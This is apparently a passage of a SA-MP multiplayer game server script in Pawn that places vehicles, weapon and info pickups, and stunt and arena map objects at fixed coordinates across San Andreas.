	CreateVehicleEx(522,2502.5520,488.1687,-65.0360,313.3215,-1,-1,respawntime,0,world_normal); // wnrg
	CreateVehicleEx(444,2460.8167,480.0310,-59.3032,261.6039,-1,-1,respawntime,0,world_normal); // wmons
	CreateVehicleEx(444,2453.7957,465.9836,-59.2928,166.1437,-1,-1,respawntime,0,world_normal); // wmons
	CreateVehicleEx(530,1710.4672,1579.2258,10.4755,81.2405,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(530,1585.6387,1662.1166,10.5843,183.2330,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(592,1400.8026,1771.1324,12.0141,271.5873,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(417,1327.0698,1602.7101,10.9088,0.3926,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(488,1281.1001,1483.1244,10.9984,180.9530,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(563,1582.6637,1448.4319,11.5380,84.0686,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(513,1624.5688,1633.1648,11.3734,179.3174,86,1,respawntime,0,world_normal); // stuntplane
	CreateVehicleEx(513,1615.3448,1633.5778,11.3659,176.8927,0,126,respawntime,0,world_normal); // stuntplane
	CreateVehicleEx(513,1606.5458,1634.0829,11.3662,174.5837,3,1,respawntime,0,world_normal); // stuntplane
	CreateVehicleEx(513,1597.4393,1635.9127,11.3706,171.6395,128,130,respawntime,0,world_normal); // stuntplane
	CreateVehicleEx(464,1649.7491,1634.1064,14.1144,85.8478,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(464,1614.3379,1472.1627,22.9730,51.7068,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(464,1647.7971,1383.8698,20.7318,171.6161,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(464,1652.6510,1350.7057,14.1101,284.4838,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(485,1709.6920,1576.5784,10.4293,81.4538,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(485,1579.9073,1662.4200,10.4752,180.0341,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(476,1492.3259,1838.6810,11.5190,180.8009,3,1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(476,1480.1274,1838.4659,11.5179,178.7234,2,1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(476,1467.6255,1838.9050,11.5196,179.1119,3,1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(553,1536.3959,1832.2166,12.1643,90.9439,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(488,1291.9226,1483.6713,10.9930,180.3749,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(593,1594.7266,1487.6222,11.2767,167.1506,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(593,1598.1353,1464.9944,11.2855,83.9314,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(593,1598.5284,1432.6324,11.2869,90.4833,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(593,1593.5265,1406.6775,11.2962,46.2187,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(519,1283.8899,1390.7821,11.7431,269.9459,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(519,1286.2432,1294.9323,11.7419,271.0877,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(511,1619.8065,1339.1478,12.1873,91.0882,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreateVehicleEx(501,1678.6779,1447.6047,47.2610,272.0046,-1,-1,respawntime,0,world_normal); // airport_vehicle
	CreatePickupEx(1242,2, 807.7548,850.9089,10.0574);
	CreatePickupEx(356,2,2507.8462,-1639.8785,13.6307);
	CreatePickupEx(353,2,2070.8372,-1571.2181,13.4221);
	CreatePickupEx(350,2,1756.8473,-1932.0759,13.4235);
	CreatePickupEx(1242,2,2011.2939,-1354.6217,23.9849);
	CreatePickupEx(1240,2,1503.7126,-1221.4723,18.9337);
	CreatePickupEx(346,2,369.8719,-2050.7329,8.0156);
	CreatePickupEx(348,2,1132.6256,-1346.1665,13.9910);
	CreatePickupEx(356,2,1342.0432,-1622.9261,17.7341);
	CreatePickupEx(372,2,2050.2852,-1158.4056,23.4506);
	CreatePickupEx(351,2,1424.2021,-1082.7992,17.5555);
	CreatePickupEx(358,2,2748.9766,-1231.3031,62.4922);
	CreatePickupEx(352,2,-2136.1860,265.5738,35.3312);
	CreatePickupEx(351,2,-1923.5642,454.0430,35.1719);
	CreatePickupEx(356,2,-1545.4366,700.3668,45.0592);
	CreatePickupEx(372,2,-2118.3772,927.7594,86.0791);
	CreatePickupEx(358,2,-2126.7971,1111.6456,76.7929);
	CreatePickupEx(350,2,-1753.7230,886.0012,295.8750);
	CreatePickupEx(351,2,-1701.1989,689.0586,24.8906);
	CreatePickupEx(372,2,-1647.8208,1428.4241,7.8828);
	CreatePickupEx(356,2,-2611.1389,286.6106,4.4409);
	CreatePickupEx(351,2,-2695.8782,28.6267,4.7326);
	CreatePickupEx(358,2,-2521.4038,-623.2798,132.7681);
	CreatePickupEx(357,2,-2503.2073,2369.8042,4.9802);
	CreatePickupEx(353,2,2016.6135,903.9200,10.8203);
	CreatePickupEx(351,2,2323.5840,1283.1169,97.5218);
	CreatePickupEx(353,2,2264.6638,2045.9447,10.8203);
	CreatePickupEx(1242,2,2105.9880,1960.6171,10.1951);
	CreatePickupEx(1240,2,2002.5812,1523.3411,17.0682);
	CreatePickupEx(358,2,1980.4905,1903.3833,122.0156);
	CreatePickupEx(357,2,2316.6152,2353.0710,17.7403);
	CreatePickupEx(350,2,2026.6127,1695.5753,8.0978);
	CreatePickupEx(351,2,2516.8982,1568.0815,11.5560);
	CreatePickupEx(350,2,2023.2216,1077.5992,11.0522);
	CreatePickupEx(358,2,216.3127,2587.0310,89.8936);
	CreatePickupEx(1242,2,2125.2041,956.9120,10.8203);
	// SRace Jetpacks
	CreatePickupEx(370,2,1922.1530,-584.2317,28.3991,0,world_srace);
	CreatePickupEx(370,2,1924.3043,-585.4131,28.3793,0,world_srace);
	CreatePickupEx(370,2,1927.0618,-586.6442,28.2474,0,world_srace);
	CreatePickupEx(370,2,1929.4943,-587.8729,28.1848,0,world_srace);
	CreatePickupEx(370,2,1932.0630,-589.2565,28.1510,0,world_srace);
	// Info
	CreatePickupEx(1239,1,2188.0828,1990.3427,10.8203,2);
	CreatePickupEx(1239,1,2158.6426,945.6713,10.8203,3);
	CreatePickupEx(1239,1,2000.7985,1538.2964,13.5859,4);
	CreatePickupEx(1239,1,-1920.4962,252.7386,41.0469,5);
	CreatePickupEx(1239,1,2068.6753,814.7855,8.5504,6);
	CreatePickupEx(1239,1,-1968.0594,291.6450,35.1719,7);
	// Fyro Fun
	CreateSObject(13592, -1530.848755, -215.221497, 23.044069, 0.0000, 0.0000, 288.9849);
	CreateSObject(973, -1520.775146, -218.737991, 13.984187, 0.0000, 0.0000, 303.7500);
	CreateSObject(973, -1529.244141, -221.201233, 13.988658, 0.0000, 0.0000, 101.2501);
	CreateSObject(13592, -1329.812256, -405.137970, 22.994070, 0.0000, 0.0000, 357.3443);
	CreateSObject(973, -1340.213867, -412.142456, 13.697121, 0.0000, 8.5944, 180.0000);
	CreateSObject(1634, -1324.592529, -453.157013, 14.445755, 0.0000, 0.0000, 112.5000);
	CreateSObject(1634, -1257.613159, -582.629333, 14.445755, 0.0000, 0.0000, 180.7821);
	CreateSObject(13592, -1299.144043, -645.211731, 32.364483, 0.0000, 0.0000, 188.5944);
	CreateSObject(971, -1310.579468, -650.423828, 22.418552, 270.6186, 353.9839, 175.7028);
	CreateSObject(972, -1260.588257, -688.849854, 22.220379, 359.1406, 0.0000, 90.0000);
	CreateSObject(972, -1279.677734, -688.981873, 21.985334, 359.1406, 0.0000, 90.0000);
	CreateSObject(13592, -1362.405884, -659.778442, 32.163319, 0.0000, 0.0000, 188.5944);
	CreateSObject(13592, -1424.899170, -675.822327, 32.421131, 0.0000, 0.0000, 186.8755);
	CreateSObject(971, -1371.026245, -664.218323, 22.483891, 270.6186, 352.2651, 172.2650);
	CreateSObject(971, -1436.777710, -680.342224, 22.470085, 270.6186, 352.2651, 172.2650);
	CreateSObject(1655, -1441.766602, -679.496338, 23.591625, 0.0000, 0.0000, 90.0000);
	CreateSObject(1655, -1449.462769, -679.466003, 27.754694, 12.0321, 0.0000, 90.0000);
	CreateSObject(1655, -1456.233276, -679.433167, 33.270653, 21.4859, 0.0000, 90.0000);
	CreateSObject(1225, -1738.459839, -566.554443, 15.890130, 180.3774, 180.4820, 231.6526);
	CreateSObject(981, -1753.463257, -580.519592, 16.287424, 0.0000, 0.0000, 270.0000);
	CreateSObject(987, -1736.869019, -566.017944, 15.484375, 0.0000, 0.0000, 270.0000);
	CreateSObject(987, -1736.751343, -577.943787, 15.335936, 0.0000, 0.0000, 270.0000);
	CreateSObject(987, -1736.721802, -583.050415, 15.335938, 0.0000, 0.0000, 270.0000);
	CreateSObject(987, -1734.834839, -606.581299, 12.978097, 0.0000, 0.8594, 276.0161);
	CreateSObject(987, -1736.067505, -594.753418, 13.396072, 0.0000, 0.8594, 276.0161);
	CreateSObject(972, -1415.195557, -486.058563, 27.186693, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1409.098022, -490.545959, 27.245104, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1406.304077, -495.980347, 27.385473, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1406.358398, -503.517883, 27.349260, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1403.213989, -509.770172, 27.388546, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1400.361450, -515.458801, 27.333933, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1397.166626, -521.803528, 27.445101, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1394.475708, -527.202820, 27.546841, 0.0000, 90.2408, 296.7972);
	CreateSObject(972, -1393.237427, -529.566895, 27.506840, 0.0000, 90.2408, 296.7972);
	CreateSObject(3665, -1642.009033, -658.435913, 15.130030, 0.0000, 0.0000, 135.0000);
	CreateSObject(1696, -1231.376465, -531.839783, 14.155671, 0.0000, 0.0000, 146.2500);
	CreateSObject(1696, -1247.848145, -557.762512, 14.151196, 0.0000, 0.0000, 326.2500);
	CreateSObject(3627, -1620.612549, -671.412109, 16.983446, 0.0000, 0.0000, 135.0001);
	CreateSObject(3627, -1654.120728, -640.376709, 16.987925, 0.0000, 0.0000, 315.0001);
	CreateSObject(1634, -1630.327759, -616.248047, 14.445759, 0.0000, 0.0000, 135.0000);
	CreateSObject(1634, -1598.442139, -649.834351, 14.445755, 0.0000, 0.0000, 135.0000);
	CreateSObject(1634, -1622.771240, -490.364655, 22.241070, 0.0000, 2.5783, 225.0000);
	CreateSObject(1634, -1605.623169, -507.666382, 22.391068, 0.0000, 0.0000, 45.0001);
	CreateSObject(1634, -1602.755005, -504.744385, 22.391068, 0.0000, 0.0000, 45.0001);
	CreateSObject(1634, -1600.083374, -501.977448, 22.391068, 0.0000, 0.0000, 45.0001);
	CreateSObject(1634, -1597.546753, -499.268921, 22.391068, 0.0000, 0.0000, 45.0001);
	CreateSObject(1634, -1595.400146, -497.046967, 22.391068, 0.0000, 0.0000, 45.0001);
	CreateSObject(1634, -1619.857300, -487.664154, 22.391068, 0.0000, 0.0000, 225.0001);
	CreateSObject(1634, -1616.896484, -484.751129, 22.391069, 0.0000, 0.0000, 225.0001);
	CreateSObject(1634, -1611.654419, -479.668182, 22.391068, 0.0000, 0.0000, 225.0001);
	CreateSObject(1634, -1614.288330, -482.165955, 22.391068, 0.0000, 0.0000, 225.0001);
	CreateSObject(1634, -1606.245728, -485.097900, 26.885056, 11.1727, 1.7189, 225.0001);
	CreateSObject(1634, -1608.759888, -487.640167, 26.785057, 11.1727, 1.7189, 225.0001);
	CreateSObject(1634, -1611.432861, -490.275055, 26.668875, 11.1727, 1.7189, 225.0001);
	CreateSObject(1634, -1614.274536, -493.084137, 26.559875, 11.1727, 0.8594, 225.0001);
	CreateSObject(1634, -1617.145752, -495.979950, 26.502356, 11.1727, 0.8594, 225.0001);
	CreateSObject(1634, -1610.914063, -502.119568, 26.610058, 11.1727, 0.8594, 45.0002);
	CreateSObject(1634, -1608.083374, -499.268372, 26.620672, 11.1727, 0.8594, 45.0002);
	CreateSObject(1634, -1605.259033, -496.396027, 26.585060, 11.1727, 0.8594, 45.0002);
	CreateSObject(1634, -1602.520752, -493.662323, 26.519171, 11.1727, 0.8594, 45.0002);
	CreateSObject(1634, -1600.524902, -491.784180, 26.413136, 11.1727, 0.8594, 45.0002);
	CreateSObject(3663, -1538.635376, -631.905945, 15.224725, 0.0000, 0.0000, 0.0002);
	CreateSObject(13648, -1254.661133, -338.969849, 13.144409, 0.0000, 0.0000, 101.2500);
	CreateSObject(13592, -1173.713013, -432.111267, 22.944071, 0.0000, 0.0000, 244.8444);
	CreateSObject(13592, -1173.144653, -446.867065, 22.994070, 0.0000, 0.0000, 244.8444);
	CreateSObject(13592, -1172.484131, -461.669830, 22.894068, 0.0000, 0.0000, 244.8444);
	CreateSObject(13648, -1254.861084, -338.261475, 13.144409, 0.0000, 0.0000, 101.2500);
	CreateSObject(13648, -1291.217041, -346.218170, 13.144409, 0.0000, 0.0000, 281.2500);
	CreateSObject(13648, -1291.329468, -345.515900, 13.144409, 0.0000, 0.0000, 281.2500);
	CreateSObject(17565, -1456.596558, -598.544617, 15.332150, 0.0000, 0.0000, 90.0000);
	CreateSObject(1682, -1427.795410, -636.121887, 19.602665, 0.0000, 0.0000, 0.0000);
	CreateSObject(1682, -1365.416748, -638.061462, 19.602665, 0.0000, 0.0000, 0.0000);
	CreateSObject(1682, -1303.735596, -633.264587, 19.598194, 0.0000, 0.0000, 0.0000);
	CreateSObject(4085, -1450.296509, -599.033386, 18.134607, 0.0000, 0.0000, 0.0000);
	CreateSObject(1634, -1410.239746, -573.236084, 14.445755, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, -1406.434082, -624.084412, 14.445755, 0.0000, 0.0000, 90.0000);
	CreateSObject(13592, -1129.137939, -353.320587, 83.211075, 356.5623, 19.7670, 231.0933);
	CreateSObject(3873, -1043.035645, -280.510651, -8.815872, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1042.593628, -269.646332, 8.941445, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1043.493896, -290.739746, 9.052106, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1054.142700, -281.588928, 9.052106, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1032.946167, -279.682007, 9.052106, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1042.791504, -280.265961, 8.941445, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1042.061401, -299.641113, 7.574258, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1029.210938, -294.385101, 7.574256, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1024.326660, -282.672058, 7.574258, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1029.667725, -267.287140, 7.570344, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1043.620117, -261.691772, 7.574258, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1056.067993, -294.741302, 7.570348, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1061.784546, -282.023804, 7.574258, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -1055.846436, -266.450958, 7.574258, 0.0000, 0.0000, 0.0000);
	CreateSObject(973, -1061.906494, -266.152252, 6.738541, 103.0280, 1.7189, 135.8594);
	CreateSObject(973, -1068.614258, -260.015656, 6.779563, 103.0280, 1.7189, 135.8594);
	CreateSObject(973, -1075.009521, -254.169250, 6.840567, 103.0280, 1.7189, 135.8594);
	CreateSObject(973, -1081.013062, -248.496262, 8.359468, 69.5102, 261.2692, 235.5547);
	CreateSObject(973, -1087.234497, -242.555130, 11.493009, 69.5102, 261.2692, 235.5547);
	CreateSObject(973, -1093.692505, -236.522964, 13.052063, 103.0280, 1.7189, 135.8594);
	CreateSObject(973, -1099.165405, -231.469940, 13.095665, 103.0280, 1.7189, 135.8594);
	CreateSObject(1660, -1230.326538, -468.532776, 13.213882, 0.0000, 0.0000, 315.0000);
	CreateSObject(1660, -1238.340820, -460.755402, 13.218353, 0.0000, 0.0000, 315.0000);
	CreateSObject(1634, -1267.650635, -454.699066, 14.441284, 0.0000, 0.0000, 326.2500);
	CreateSObject(1634, -1270.770630, -452.633667, 14.445755, 0.0000, 0.0000, 326.2500);
	CreateSObject(1634, -1267.202271, -447.313965, 14.445755, 0.0000, 0.0000, 146.2500);
	CreateSObject(1634, -1264.127808, -449.306610, 14.441286, 0.0000, 0.0000, 146.2500);
	CreateSObject(3279, -1343.142212, -209.173752, 13.224054, 0.0000, 0.0000, 135.0000);
	CreateSObject(1458, -1191.933716, -395.713409, 13.402019, 0.0000, 0.0000, 146.2500);
	CreateSObject(3665, -1478.553345, 11.669815, 15.130030, 0.0000, 0.0000, 315.0000);
	CreateSObject(3664, -1102.784546, 390.115265, 19.977345, 0.0000, 0.0000, 315.0000);
	CreateSObject(1634, -1573.612061, -113.345078, 14.344201, 0.0000, 0.0000, 292.5000);
	CreateSObject(1634, -1566.709961, -110.523094, 18.809891, 11.1727, 0.0000, 292.5000);
	CreateSObject(3663, -1649.915894, -168.149048, 15.229211, 0.0000, 0.0000, 225.0000);
	CreateSObject(3663, -1660.853271, -157.213760, 15.229211, 0.0000, 0.0000, 225.0000);
	CreateSObject(3852, -1576.665039, -102.621407, 14.582679, 0.0000, 0.0000, 315.0000);
	CreateSObject(3852, -1595.483154, -84.142899, 14.632676, 0.0000, 0.0000, 315.0000);
	CreateSObject(12956, -1345.398560, 130.787598, 16.394140, 0.0000, 0.0000, 45.0000);
	CreateSObject(3461, -1639.150635, -174.120819, 14.811248, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1614.656860, -149.243378, 14.784081, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1591.558594, -126.258743, 14.792130, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1563.124512, -97.708649, 14.783920, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1537.494019, -71.466179, 14.723449, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1468.342773, -3.112625, 14.797668, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1442.536499, 23.277260, 14.723449, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1408.144897, 57.329792, 14.773714, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1376.422119, 88.963127, 14.780709, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1371.833618, 124.695328, 14.715900, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1366.097168, 119.286324, 14.715899, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1351.638916, 114.079330, 14.715899, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1324.326172, 141.232697, 14.778279, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1291.504028, 173.980438, 14.776807, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1264.562256, 201.092926, 14.723449, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1231.236328, 234.118713, 14.819832, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1202.210938, 262.947540, 14.841795, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1177.351685, 288.103485, 14.810292, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, -1143.267090, 321.852661, 14.845904, 0.0000, 0.0000, 0.0000);
	CreateSObject(13590, -1367.905273, -188.897858, 14.249300, 0.0000, 0.0000, 157.5000);
	CreateSObject(13592, -1493.698975, -49.933868, 22.917511, 0.0000, 1.7189, 19.0622);
	CreateSObject(13592, -1490.232910, -40.404480, 22.919071, 0.0000, 3.4377, 25.0783);
	CreateSObject(13592, -1488.841553, -31.570324, 23.117512, 0.0000, 0.0000, 24.2189);
	CreateSObject(7392, -1211.604004, 257.273865, 22.343519, 353.9839, 1.7189, 44.1409);
	CreateSObject(7392, -1232.307495, 280.123749, 21.793528, 355.7028, 1.7189, 224.1407);
	CreateSObject(12956, -1352.101440, -265.176331, 16.476685, 0.0000, 0.0000, 45.0000);
	CreateSObject(1634, -1368.211792, -265.957825, 22.030870, 7.7349, 0.0000, 135.0000);
	CreateSObject(1634, -1337.906006, -273.325897, 14.445755, 7.7349, 0.0000, 168.7500);
	CreateSObject(1660, -1580.253784, -87.727097, 12.693363, 0.0000, 0.0000, 135.0000);
	CreateSObject(13636, -1279.451294, -258.196930, 15.428829, 0.0000, 0.0000, 202.5000);
	CreateSObject(13641, -1239.565552, 263.714478, 14.867682, 0.0000, 0.0000, 45.0000);
	CreateSObject(13641, -1227.491699, 251.777573, 14.867682, 0.0000, 0.0000, 45.0000);
	CreateSObject(17565, -1165.918579, 325.191956, 15.333713, 0.0000, 0.0000, 315.0000);
	CreateSObject(18451, -1677.391357, -271.504761, 13.656393, 0.0000, 0.0000, 168.7500);
	CreateSObject(18451, -1643.098267, -278.276031, 13.660864, 0.0000, 0.0000, 168.7500);
	CreateSObject(18451, -1705.457153, -267.908386, 13.656389, 0.0000, 0.0000, 180.0000);
	CreateSObject(18451, -1616.638550, -287.389465, 13.660864, 0.0000, 0.0000, 157.5000);
	CreateSObject(973, -1608.645630, -289.908783, 13.988658, 0.0000, 0.0000, 337.5000);
	CreateSObject(973, -1600.227783, -293.381714, 13.988658, 0.0000, 0.0000, 337.5000);
	CreateSObject(973, -1591.910156, -296.819336, 13.988658, 0.0000, 0.0000, 337.5000);
	CreateSObject(973, -1624.023926, -283.823730, 13.988658, 0.0000, 0.0000, 337.5000);
	CreateSObject(973, -1632.610718, -280.819183, 13.909186, 0.0000, 359.1406, 344.3755);
	CreateSObject(973, -1635.030518, -280.094482, 13.892116, 0.0000, 359.1406, 342.6566);
	CreateSObject(973, -1651.032593, -275.542358, 13.988658, 0.0000, 0.0000, 348.7500);
	CreateSObject(973, -1659.623413, -273.815521, 13.988658, 0.0000, 0.0000, 348.7500);
	CreateSObject(973, -1668.763794, -272.368042, 13.988656, 0.0000, 0.0000, 353.0472);
	CreateSObject(973, -1685.678101, -269.368927, 13.988658, 0.0000, 0.0000, 353.0472);
	CreateSObject(973, -1694.368896, -268.325684, 13.988658, 0.0000, 0.0000, 353.0472);
	CreateSObject(973, -1697.408325, -267.913666, 13.968430, 0.0000, 0.0000, 353.0472);
	CreateSObject(973, -1714.000977, -267.108826, 13.988658, 0.0000, 0.0000, 353.0472);
	CreateSObject(973, -1722.671875, -266.012207, 13.984185, 0.0000, 0.0000, 353.0472);
	CreateSObject(973, -1731.545532, -264.921631, 13.987653, 0.0000, 0.0000, 353.0472);
	CreateSObject(12956, -1471.094482, -137.673767, 16.401686, 0.0000, 0.0000, 45.0000);
	CreateSObject(1503, -1592.314819, -231.063004, 13.542555, 0.0000, 0.0000, 315.0000);
	CreateSObject(1503, -1606.591431, -214.742416, 13.542553, 0.0000, 0.0000, 315.0000);
	CreateSObject(1503, -1620.652100, -201.210464, 13.542553, 0.0000, 0.0000, 315.0000);
	CreateSObject(1503, -1632.577393, -187.322189, 13.542557, 0.0000, 0.0000, 315.0000);
	CreateSObject(13592, -1681.307373, -195.437225, 22.994070, 0.0000, 0.0000, 232.7349);
	CreateSObject(1655, -1537.106689, -205.687119, 14.298553, 0.0000, 0.0000, 11.2500);
	CreateSObject(1655, -1317.321045, -402.813629, 14.248549, 0.0000, 0.0000, 258.7500);
	CreateSObject(1378, -1587.706177, -155.029327, 37.555225, 0.0000, 0.0000, 315.0000);
	CreateSObject(13647, -1401.106445, 48.931145, 13.542847, 0.0000, 0.0000, 45.0000);
	CreateSObject(13647, -1400.639648, 48.367264, 13.542847, 0.0000, 0.0000, 45.0000);
	CreateSObject(13647, -1373.761230, 75.287933, 13.542847, 0.0000, 0.0000, 225.0000);
	CreateSObject(13647, -1374.254639, 75.779793, 13.542847, 0.0000, 0.0000, 225.0000);
	CreateSObject(1634, -1364.749878, -43.674553, 14.445755, 0.0000, 0.0000, 315.0000);
	CreateSObject(1428, -1223.108521, -142.971771, 41.204536, 283.5102, 0.0000, 202.5000);
	CreateSObject(1428, -1222.623779, -142.779892, 41.193516, 283.5102, 0.0000, 202.5000);
	CreateSObject(1428, -1222.147949, -142.615204, 41.199749, 283.5102, 0.0000, 202.5000);
	CreateSObject(13642, -1133.792480, -199.302078, 15.122119, 0.0000, 0.0000, 11.2500);
	CreateSObject(17565, -1242.637207, -22.235634, 15.357148, 0.0000, 0.0000, 315.0000);
	CreateSObject(8395, -1327.053101, -2.137146, 24.871904, 0.0000, 0.0000, 316.3234);
	CreateSObject(3625, -1393.984619, -124.873184, 15.708618, 0.0000, 0.0000, 157.5000);
	CreateSObject(3625, -1241.030151, -282.853485, 15.658619, 0.0000, 0.0000, 112.5000);
	CreateSObject(1634, -1351.765259, -56.634880, 14.445755, 0.0000, 0.0000, 315.0000);
	CreateSObject(1634, -1379.883057, -28.633923, 14.445759, 0.0000, 0.0000, 315.0000);
	CreateSObject(978, -1667.058594, -543.896118, 11.199594, 0.0000, 0.0000, 225.0000);
	CreateSObject(978, -1650.075317, -526.871521, 11.192096, 0.0000, 0.0000, 225.0000);
	CreateSObject(979, -1658.615723, -552.094055, 11.199595, 0.0000, 0.0000, 45.0000);
	CreateSObject(979, -1642.076416, -535.520142, 11.192096, 0.0000, 0.0000, 45.0000);
	CreateSObject(979, -1562.175659, -454.738708, 5.988657, 0.0000, 0.0000, 45.0000);
	CreateSObject(979, -1550.204590, -442.982330, 5.962010, 0.0000, 0.0000, 45.0000);
	CreateSObject(978, -1569.525513, -447.463013, 5.840220, 0.0000, 0.0000, 225.0000);
	CreateSObject(978, -1557.741943, -435.431274, 5.840220, 0.0000, 0.0000, 225.0000);
	CreateSObject(979, -1538.733154, -417.003601, 5.698528, 0.0000, 0.0000, 135.0000);
	CreateSObject(978, -1532.014648, -423.707214, 5.698529, 0.0000, 0.0000, 135.0000);
	CreateSObject(1634, -1257.525269, -590.257263, 18.895687, 10.3132, 0.0000, 180.7821);
	CreateSObject(5013, -1157.402222, -385.575806, 83.846390, 346.2490, 0.0000, 315.0000);
	CreateSObject(5013, -1211.935425, -440.181458, 79.709061, 19.7670, 0.0000, 315.0000);
	CreateSObject(5013, -1262.535767, -490.767090, 53.340889, 20.6265, 0.0000, 315.0000);
	CreateSObject(5013, -1311.266724, -539.419922, 27.345291, 20.6265, 0.0000, 315.0000);
	CreateSObject(973, -1324.973999, -563.009155, 13.988659, 0.0000, 0.0000, 315.0000);
	CreateSObject(973, -1331.403931, -556.608032, 13.988658, 0.0000, 0.0000, 315.0000);
	CreateSObject(973, -1335.018555, -553.012573, 13.988658, 0.0000, 0.0000, 315.0000);
	CreateSObject(973, -1340.802734, -553.608521, 13.984186, 0.0000, 0.0000, 54.5311);
	CreateSObject(973, -1325.377808, -568.982971, 13.988658, 0.0000, 0.0000, 217.1877);
	// War
	CreateSObject(971, -1355.5256, 1243.5609, 1039.8671, 0.0, 0.0, 267.2144, object_show_distance, 16);
	CreateSObject(971, -1355.728, 1251.6347, 1039.8671, 0.0, 0.0, 279.0976, object_show_distance, 16);
	CreateSObject(971, -1356.4893, 1235.679, 1039.8671, 0.0, 0.0, 257.1875, object_show_distance, 16);
	CreateSObject(971, -1357.8747, 1259.4935, 1039.8671, 0.0, 0.0, 292.8609, object_show_distance, 16);
	CreateSObject(971, -1361.8826, 1266.7132, 1039.8671, 0.0, 0.0, 305.7078, object_show_distance, 16);
	CreateSObject(971, -1359.6292, 1227.4438, 1039.8671, 0.0, 0.0, 245.5941, object_show_distance, 16);
	CreateSObject(971, -1363.7676, 1220.7299, 1039.8671, 0.0, 0.0, 234.9407, object_show_distance, 16);
	CreateSObject(971, -1366.7397, 1273.3447, 1039.8671, 0.0, 0.0, 308.2145, object_show_distance, 16);
	CreateSObject(971, -1368.7513, 1215.2677, 1039.8671, 0.0, 0.0, 222.0941, object_show_distance, 16);
	CreateSObject(971, -1375.3366, 1210.5208, 1039.8671, 0.0, 0.0, 209.5605, object_show_distance, 16);
	CreateSObject(971, -1372.6445, 1279.2656, 1039.8671, 0.0, 0.0, 323.8813, object_show_distance, 16);
	CreateSObject(971, -1382.0044, 1207.2954, 1039.8671, 0.0, 0.0, 196.7138, object_show_distance, 16);
	CreateSObject(971, -1379.8895, 1283.3664, 1039.8671, 0.0, 0.0, 339.2582, object_show_distance, 16);
	CreateSObject(971, -1389.3097, 1205.3645, 1039.8671, 0.0, 0.0, 190.1337, object_show_distance, 16);
	CreateSObject(971, -1397.3012, 1204.6231, 1039.8671, 0.0, 0.0, 178.5403, object_show_distance, 16);
	CreateSObject(971, -1388.0995, 1285.545, 1039.8671, 0.0, 0.0, 350.2249, object_show_distance, 16);
	CreateSObject(971, -1405.4029, 1205.5955, 1039.8671, 0.0, 0.0, 166.9469, object_show_distance, 16);
	CreateSObject(971, -1413.1801, 1208.2651, 1039.8671, 0.0, 0.0, 155.9801, object_show_distance, 16);
	CreateSObject(971, -1420.6617, 1212.3712, 1039.8671, 0.0, 0.0, 145.0134, object_show_distance, 16);
	CreateSObject(971, -1404.9794, 1285.6394, 1039.8671, 0.0, 0.0, 7.4818, object_show_distance, 16);
